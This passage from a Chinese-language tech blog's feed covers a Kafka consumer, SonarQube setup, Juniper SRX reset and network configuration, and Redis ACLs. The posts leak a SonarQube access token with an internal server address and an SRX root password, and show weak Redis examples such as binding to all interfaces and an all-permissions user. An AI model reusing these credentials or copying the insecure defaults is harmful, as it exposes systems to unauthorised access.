        int recordCount = records.count();  
        log.info(&amp;quot;Received &amp;quot; + recordCount + &amp;quot; record(s)&amp;quot;);  
        BulkRequest bulkRequest = new BulkRequest();  
        for (ConsumerRecord&amp;lt;String, String&amp;gt; record : records){  
            try{  
                String id = extractId(record.value());  
                // send the record into opensearch  
                IndexRequest indexRequest = new IndexRequest(indexName)  
                        .source(record.value(), XContentType.JSON)  
                        .id(id);  
                //IndexResponse indexResponse = openSearchClient.index(indexRequest, RequestOptions.DEFAULT);  
                bulkRequest.add(indexRequest);  
            } catch (Exception e){  
  
            }  
        }  
        if (bulkRequest.numberOfActions() &amp;gt; 0){  
            BulkResponse bulkResponse = openSearchClient.bulk(bulkRequest, RequestOptions.DEFAULT);  
            log.info(&amp;quot;Inserted &amp;quot; + bulkResponse.getItems().length + &amp;quot; record(s).&amp;quot;);  
            try {  
                Thread.sleep(1000);  
            } catch (InterruptedException e) {  
                e.printStackTrace();  
            }  
  
        }  
  
        consumer.commitAsync();  
        log.info(&amp;quot;offset have been committed!&amp;quot;);  
    }  
} catch (WakeupException e){  
    log.info(&amp;quot;Consumer is starting to shutdown&amp;quot;);  
} catch (Exception e){  
    log.error(&amp;quot;unexpected exception: &amp;quot;, e);  
} finally {  
    consumer.close(); // close the consumer, this will also commit offest to kafka.  
    openSearchClient.close();  
    log.info(&amp;quot;The consumer is now gracefully shut down&amp;quot;);  
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Consumer offset reset 行為/" >
        </entry>
        <entry>
            <title>
                SonarQube 靜態程式碼檢查工具
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/SonarQube 靜態程式碼檢查工具/</id>
            <content type="html">
                &lt;h1 id=&quot;簡介&quot; tabindex=&quot;-1&quot;&gt;簡介&lt;/h1&gt;
&lt;h3 id=&quot;sonar-qube&quot; tabindex=&quot;-1&quot;&gt;SonarQube&lt;/h3&gt;
&lt;p&gt;屬於 SAST(Static Application Security Testing) 工具，會做為程式品質的守門員，內含 js、python、lua 等代碼風格規則集。&lt;/p&gt;
&lt;h3 id=&quot;deepfence&quot; tabindex=&quot;-1&quot;&gt;deepfence&lt;/h3&gt;
&lt;p&gt;使用 Deepfence 做 DAST(Dynamic Application Security Testing)  監控，目的是讓線上服務的進出流量都受到 OWASP 安全掃描，最終掃描結果會放到主控台&lt;/p&gt;
&lt;h2 id=&quot;sdlc&quot; tabindex=&quot;-1&quot;&gt;SDLC&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241211135117.png&quot; alt=&quot;Pasted image 20241211135117.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;DAST&lt;br /&gt;
&lt;a href=&quot;https://community.deepfence.io/threatmapper/docs/installation/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://community.deepfence.io/threatmapper/docs/installation/&lt;/a&gt;&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241211135659.png&quot; alt=&quot;Pasted image 20241211135659.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;firewall&quot; tabindex=&quot;-1&quot;&gt;Firewall&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Entity&lt;/th&gt;
&lt;th&gt;Port&lt;/th&gt;
&lt;th&gt;direction&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;SonarQube Server&lt;/td&gt;
&lt;td&gt;9000&lt;/td&gt;
&lt;td&gt;inbound&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&quot;使用平台&quot; tabindex=&quot;-1&quot;&gt;使用平台&lt;/h1&gt;
&lt;p&gt;SonarQube&lt;/p&gt;
&lt;p&gt;這次使用的平台定位在 test 之後要 release 之前&lt;br /&gt;
&lt;a href=&quot;https://docs.sonarsource.com/sonarqube-community-build/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://docs.sonarsource.com/sonarqube-community-build/&lt;/a&gt;&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241211133427.png&quot; alt=&quot;Pasted image 20241211133427.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;後台管理頁面&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker run -d --name sonarqube -p 9000:9000 -p 9092:9092 sonarqube
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;建立 project key&lt;br /&gt;
&lt;a href=&quot;https://docs.sonarsource.com/sonarqube-server/latest/analyzing-source-code/scanners/sonarscanner/#configuring-your-project&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://docs.sonarsource.com/sonarqube-server/latest/analyzing-source-code/scanners/sonarscanner/#configuring-your-project&lt;/a&gt;&lt;br /&gt;
在欲掃描的資料夾底下建立 sonar-project.properties&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ touch sonar-project.properties
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;填入 project key&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# must be unique in a given SonarQube Server instance
sonar.projectKey=my:project
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;產出 token&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241211132541.png&quot; alt=&quot;Pasted image 20241211132541.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;取得 project key、token&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241211132632.png&quot; alt=&quot;Pasted image 20241211132632.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;帶入環境變數進行程式碼掃描&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker run &#92;
--rm &#92;
-e SONAR_HOST_URL=&amp;quot;http://10.66.16.108:9000&amp;quot;  &#92;
-e SONAR_TOKEN=sqp_4e22abc134b4d52b9fe654b7d549427abb71db90 &#92;
-v &amp;quot;$(pwd)/:/usr/src&amp;quot; &#92;
sonarsource/sonar-scanner-cli
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241211134142.png&quot; alt=&quot;Pasted image 20241211134142.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;掃描結果&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241211134155.png&quot; alt=&quot;Pasted image 20241211134155.png&quot; /&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/SonarQube 靜態程式碼檢查工具/" >
        </entry>
        <entry>
            <title>
                重置 SRX
                
            </title>
            <updated>2026-01-01T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/SRX/重置 SRX/</id>
            <content type="html">
                &lt;p&gt;進入 &lt;code&gt;cli&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@% cli
root&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;進入 configuration mode&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root&amp;gt; configure
Entering configuration mode
The configuration has been changed but not committed

[edit]
root#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;輸入 &lt;code&gt;delete&lt;/code&gt;，並回答 &lt;code&gt;yes&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root# delete
This will delete the entire configuration
Delete everything under this level? [yes,no] (no) yes


[edit]
root#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;重設 root 帳號密碼&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root# set system root-authentication plain-text-password
New password:
Retype new password:

[edit]
root#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;輸入 &lt;code&gt;commit&lt;/code&gt; 提交變更&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root# commit
commit complete

[edit]
root#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;輸入 &lt;code&gt;exit&lt;/code&gt; 離開 config 模式&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root# exit
Exiting configuration mode

root&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/SRX/重置 SRX/" >
        </entry>
        <entry>
            <title>
                SRX 配置 Default gateway
                
            </title>
            <updated>2026-01-02T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/SRX/SRX 配置 Default gateway/</id>
            <content type="html">
                &lt;p&gt;目前環境前面有一個 Fortigate&lt;/p&gt;
&lt;p&gt;所以先檢查 routing-table 的狀態&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;get router info routing-table all
...
Routing table for VRF=0
S*      0.0.0.0/0 [10/0] via 10.6x.1.1, wanlink, [1/0]
...
C       10.7x.1x.0/24 is directly connected, my_esxi
...
FGT60F # 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;檢查 SRX 上的自動收到 arp 封包產生的 arp table&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root&amp;gt; show arp no-resolve
MAC Address       Address         Interface     Flags
0x:x5:x0:ax:ex:xx 10.7x.1x.254    fe-0/0/7.0           none

root&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;要配置在 SRX 上的 default gateway 就會是 10.7x.1x.254，靜態 IP 就要在 10.7x.1x.25/24 裡面挑一個 IP&lt;/p&gt;
&lt;h2 id=&quot;下一步&quot; tabindex=&quot;-1&quot;&gt;下一步&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;配置一個 route 規則&lt;br /&gt;
詳見 &lt;a class=&quot;internal-link&quot; target=&quot;&quot; data-note-icon=&quot;&quot; href=&quot;https://hung-jia-jun.github.io/%E6%8A%80%E8%A1%93%E6%96%87%E4%BB%B6/SRX/SRX%20%E4%B8%8A%E7%B6%B2%E8%A8%AD%E5%AE%9A/&quot;&gt;SRX 上網設定&lt;/a&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/SRX/SRX 配置 Default gateway/" >
        </entry>
        <entry>
            <title>
                SRX 上網設定
                
            </title>
            <updated>2026-01-01T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/SRX/SRX 上網設定/</id>
            <content type="html">
                &lt;p&gt;::: hidden&lt;br /&gt;
帳號 : root&lt;br /&gt;
密碼 : 1qaz2wsx&lt;br /&gt;
:::&lt;/p&gt;
&lt;h2 id=&quot;網路拓樸圖&quot; tabindex=&quot;-1&quot;&gt;網路拓樸圖&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020260101201716.png&quot; alt=&quot;Pasted image 20260101201716.png&quot; /&gt;&lt;br /&gt;
若需要重置 SRX 可以參考 &lt;a class=&quot;internal-link&quot; target=&quot;&quot; data-note-icon=&quot;&quot; href=&quot;https://hung-jia-jun.github.io/%E6%8A%80%E8%A1%93%E6%96%87%E4%BB%B6/SRX/%E9%87%8D%E7%BD%AE%20SRX/&quot;&gt;重置 SRX&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;初始狀態(無法上網)&quot; tabindex=&quot;-1&quot;&gt;初始狀態(無法上網)&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;初始狀態&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root&amp;gt; show interfaces terse
Interface               Admin Link Proto    Local                 Remote
fe-0/0/0                up    up
...
fe-0/0/1                up    up
fe-0/0/2                up    down
fe-0/0/3                up    down
fe-0/0/4                up    down
fe-0/0/5                up    down
fe-0/0/6                up    down
fe-0/0/7                up    down
...
---(more)---
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;fe-0/0/0  有連接數據機，但沒有被數據機配置 IP，現在要來設定 Static IP&lt;/p&gt;
&lt;p&gt;無法 &lt;code&gt;ping 8.8.8.8&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root&amp;gt; ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8): 56 data bytes
ping: sendto: Can&#39;t assign requested address
ping: sendto: Can&#39;t assign requested address
ping: sendto: Can&#39;t assign requested address
^C
--- 8.8.8.8 ping statistics ---
3 packets transmitted, 0 packets received, 100% packet loss

root&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;default-gateway&quot; tabindex=&quot;-1&quot;&gt;檢查 default gateway&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;輸入 &lt;code&gt;netstat -nr | grep default&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;netstat -nr | grep default
default 192.168.1.1 UGScg                 en0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;default gateway 為 &lt;code&gt;192.168.1.1&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;arp-table&quot; tabindex=&quot;-1&quot;&gt;檢查 arp table&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;輸入 &lt;code&gt;arp -an&lt;/code&gt; 檢查未被使用的 IP&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ arp -an
? (192.168.1.1) at a8:c2:46:c:5a:71 on en0 ifscope [ethernet]
? (192.168.1.110) at b6:d5:a6:81:7d:64 on en0 ifscope [ethernet]
? (192.168.1.111) at ba:1d:e9:3:da:b1 on en0 ifscope [ethernet]
? (192.168.1.255) at ff:ff:ff:ff:ff:ff on en0 ifscope [ethernet]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以本次範例來說，可將 SRX 設定一個靜態 IP 在  &lt;code&gt;192.168.1.2/32&lt;/code&gt; 因為尚未被使用&lt;/p&gt;
&lt;h2 id=&quot;設定流程&quot; tabindex=&quot;-1&quot;&gt;設定流程&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;進入 &lt;code&gt;cli&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@% cli
root&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;進入 configuration mode&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root&amp;gt; configure
Entering configuration mode
The configuration has been changed but not committed

[edit]
root#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;設定靜態 IP&lt;br /&gt;
Default gateway: &lt;code&gt;192.168.1.1&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root# set interfaces fe-0/0/0 unit 0 family inet
root# set interfaces fe-0/0/0 unit 0 family inet address 192.168.1.2/24
root# set routing-options static route 0.0.0.0/0 next-hop 192.168.1.1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;將 fe-0/0/0.0 介面放入 untrust 區域&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root# set security zones security-zone untrust interfaces fe-0/0/0.0 host-inbound-traffic system-services ping
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;commit&lt;/code&gt; 保存&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root# commit
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;輸入 &lt;code&gt;exit&lt;/code&gt; 離開 configuration mode&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root# exit
Exiting configuration mode

root&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;確認能否上網&quot; tabindex=&quot;-1&quot;&gt;確認能否上網&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;輸入 &lt;code&gt;show interfaces terse&lt;/code&gt; 靜態 IP 已配置為 &lt;code&gt;192.168.1.2/24&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root&amp;gt; show interfaces terse
Interface               Admin Link Proto    Local                 Remote
fe-0/0/0                up    up
fe-0/0/0.0              up    up   inet     192.168.1.2/24
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;從 arp table 已能發現靜態 IP (&lt;code&gt;192.168.1.2&lt;/code&gt;)已配置完成&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;jason@my-mac ~ % arp -an
? (192.168.1.1) at a8:c2:46:c:5a:71 on en0 ifscope [ethernet]
? (192.168.1.2) at 84:18:88:b8:82:0 on en0 ifscope [ethernet]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以從 SRX ping 到 8.8.8.8&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root&amp;gt; ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8): 56 data bytes
64 bytes from 8.8.8.8: icmp_seq=0 ttl=116 time=4.052 ms
64 bytes from 8.8.8.8: icmp_seq=1 ttl=116 time=5.899 ms
^C
--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 packets received, 0% packet loss
round-trip min/avg/max/stddev = 4.052/4.976/5.899/0.923 ms

root&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;總結&quot; tabindex=&quot;-1&quot;&gt;總結&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;現在 SRX 已能透過 Default gateway 上網，下一步是要讓連接 SRX 的設備能上網&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/SRX/SRX 上網設定/" >
        </entry>
        <entry>
            <title>
                Redis stream 訂閱權限設定
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/Redis/Redis stream 訂閱權限設定/</id>
            <content type="html">
                &lt;p&gt;Redis ACL&lt;br /&gt;
&lt;a href=&quot;https://redis.io/docs/latest/operate/oss_and_stack/management/security/acl/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://redis.io/docs/latest/operate/oss_and_stack/management/security/acl/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;stream&quot; tabindex=&quot;-1&quot;&gt;建立 Stream&lt;/h2&gt;
&lt;p&gt;Redis Stream 是「&lt;strong&gt;lazy creation&lt;/strong&gt;」，也就是只要你往一個 key 寫入資料，它就會自動建立。&lt;/p&gt;
&lt;h3 id=&quot;code-mystream-code-stream&quot; tabindex=&quot;-1&quot;&gt;建立一個名為 &lt;code&gt;mystream&lt;/code&gt; 的 Stream&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;XADD mystream * message &amp;quot;Hello World&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;*&lt;/code&gt; → 自動生成 ID（timestamp-based）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;message &amp;quot;Hello World&amp;quot;&lt;/code&gt; → 欄位與值，可以一次放多個欄位&lt;br /&gt;
執行後，&lt;code&gt;mystream&lt;/code&gt; 就存在了。&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218135834.png&quot; alt=&quot;Pasted image 20251218135834.png&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;stream-channel&quot; tabindex=&quot;-1&quot;&gt;列出所有 stream channel&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;SCAN 0 TYPE stream
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218140101.png&quot; alt=&quot;Pasted image 20251218140101.png&quot; /&gt;&lt;/p&gt;
&lt;h3 id=&quot;mystream&quot; tabindex=&quot;-1&quot;&gt;建立只能訂閱 mystream 的使用者&lt;/h3&gt;
&lt;p&gt;語法如下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ACL SETUSER stream_user on &amp;gt;StrongPassword +XREAD +XREADGROUP +XRANGE +XINFO ~{{YOUR_STREAM_NAME}}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;example:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ACL SETUSER stream_user on &amp;gt;YOUR_PASSWORD +XREAD +XREADGROUP +XRANGE +XINFO ~mystream
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;[!NOTE]&lt;br /&gt;
stream_user → 新使用者名稱&lt;br /&gt;
on → 啟用帳號&lt;br /&gt;
YOUR_PASSWORD → 密碼&lt;br /&gt;
+XREAD +XREADGROUP +XRANGE +XINFO → 允許讀取 Stream 的命令&lt;br /&gt;
~my-stream → 只允許存取這個 key，其他 Stream key 都不能存取。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;acl-redis&quot; tabindex=&quot;-1&quot;&gt;使用受 ACL 權限控管的使用者連線到 Redis&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;redis-cli -u redis://stream_user:YOUR_PASSWORD@127.0.0.1:6379
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218140714.png&quot; alt=&quot;Pasted image 20251218140714.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;連線後只要操作 &lt;code&gt;my-stream&lt;/code&gt; 可以成功，其他 Stream key 會出現權限錯誤：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;XREAD COUNT 1 STREAMS mystream 0   # 成功 XREAD COUNT 1 
STREAMS other-stream 0 # 失敗 -&amp;gt; No Permissions to access a key
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218140855.png&quot; alt=&quot;Pasted image 20251218140855.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;最後記得 &lt;code&gt;acl save&lt;/code&gt;  持久化保存&lt;br /&gt;
如何做 ACL 持久化請參閱&lt;br /&gt;
&lt;a class=&quot;internal-link&quot; target=&quot;&quot; data-note-icon=&quot;&quot; href=&quot;https://hung-jia-jun.github.io/%E6%8A%80%E8%A1%93%E6%96%87%E4%BB%B6/Redis/Redis%20ACL%20%E6%8C%81%E4%B9%85%E5%8C%96/&quot;&gt;Redis ACL 持久化&lt;/a&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/Redis/Redis stream 訂閱權限設定/" >
        </entry>
        <entry>
            <title>
                Redis ACL 持久化
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/Redis/Redis ACL 持久化/</id>
            <content type="html">
                &lt;h1 id=&quot;主旨&quot; tabindex=&quot;-1&quot;&gt;主旨&lt;/h1&gt;
&lt;p&gt;因為在 &lt;a class=&quot;internal-link&quot; target=&quot;&quot; data-note-icon=&quot;&quot; href=&quot;https://hung-jia-jun.github.io/%E6%8A%80%E8%A1%93%E6%96%87%E4%BB%B6/Redis/Redis%20stream%20%E8%A8%82%E9%96%B1%E6%AC%8A%E9%99%90%E8%A8%AD%E5%AE%9A/&quot;&gt;Redis stream 訂閱權限設定&lt;/a&gt; 時，無法 &lt;code&gt;acl save&lt;/code&gt;&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218141616.png&quot; alt=&quot;Pasted image 20251218141616.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;故需要設定 aclfile 才能儲存 redis acl 設定&lt;/p&gt;
&lt;h1 id=&quot;環境準備&quot; tabindex=&quot;-1&quot;&gt;環境準備&lt;/h1&gt;
&lt;hr /&gt;
&lt;h2 id=&quot;redis&quot; tabindex=&quot;-1&quot;&gt;建立 redis&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;docker compose&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-fold&quot;&gt;version: &amp;quot;3.9&amp;quot;
services:
  redis:
    image: redis:7.2  # Redis 7+ 才支援 ACL 持久化
    container_name: redis_acl
    ports:
      - &amp;quot;6379:6379&amp;quot;
    volumes:
      - ./redis-data:/data         # 資料持久化
      - ./redis-acl.conf:/usr/local/etc/redis/redis-acl.conf:ro  # 自訂 ACL config
    command: [&amp;quot;redis-server&amp;quot;, &amp;quot;/usr/local/etc/redis/redis-acl.conf&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;建立 redis-acl.conf 與 acl 設定檔&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;touch redis-acl.conf
mkdir -p ./redis-data
touch ./redis-data/users.acl
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在 redis-acl.conf 填入以下內容&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# redis-acl.conf
bind 0.0.0.0
port 6379

# 指定 ACL file
aclfile /data/users.acl
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;資料夾結構&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;.
├── docker-compose.yml
├── redis-acl.conf
└── redis-data
    └── users.acl

2 directories, 3 files
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;啟動 redis&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;docker compose up -d                       
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;連線到 redis&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;redis-cli
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;建立 Redis user&lt;br /&gt;
此使用者只能訂閱 mystream (承 &lt;a class=&quot;internal-link&quot; target=&quot;&quot; data-note-icon=&quot;&quot; href=&quot;https://hung-jia-jun.github.io/%E6%8A%80%E8%A1%93%E6%96%87%E4%BB%B6/Redis/Redis%20stream%20%E8%A8%82%E9%96%B1%E6%AC%8A%E9%99%90%E8%A8%AD%E5%AE%9A/&quot;&gt;Redis stream 訂閱權限設定&lt;/a&gt;)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ACL SETUSER stream_user on &amp;gt;YOUR_PASSWORD +XREAD +XREADGROUP +XRANGE +XINFO ~mystream
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;儲存 ACL 設定&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;acl save
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218211319.png&quot; alt=&quot;Pasted image 20251218211319.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;重新啟動 redis&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker compose down -v &amp;amp;&amp;amp; docker compose up -d 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218211358.png&quot; alt=&quot;Pasted image 20251218211358.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;登入剛建立的 ACL 帳戶&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ redis-cli
127.0.0.1:6379&amp;gt;  auth stream_user YOUR_PASSWORD
OK
127.0.0.1:6379&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;stream_user 有持久化保存&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218211452.png&quot; alt=&quot;Pasted image 20251218211452.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;測試未 acl save 就退出的情況&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218212007.png&quot; alt=&quot;Pasted image 20251218212007.png&quot; /&gt;&lt;/p&gt;
&lt;h3 id=&quot;optional-user&quot; tabindex=&quot;-1&quot;&gt;optional - 預定義 user&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;編輯 &lt;code&gt;/redis-data/users.acl&lt;/code&gt;，加入預設使用者：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;user stream_user2 on &amp;gt;mypassword ~* +@all
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218213146.png&quot; alt=&quot;Pasted image 20251218213146.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;啟動 redis 後也能看到剛剛設定的 stream_user2&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218213253.png&quot; alt=&quot;Pasted image 20251218213253.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;結語&quot; tabindex=&quot;-1&quot;&gt;結語&lt;/h2&gt;
&lt;p&gt;透過 acl save 可以將 redis-cli session 期間建立的 user 持久化保存，也能透過預先定義的 user.acl 建立 user&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/Redis/Redis ACL 持久化/" >
        </entry>
        <entry>
            <title>
                HA proxy VRRP 研究
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/Proxy/HA proxy VRRP 研究/</id>
            <content type="html">
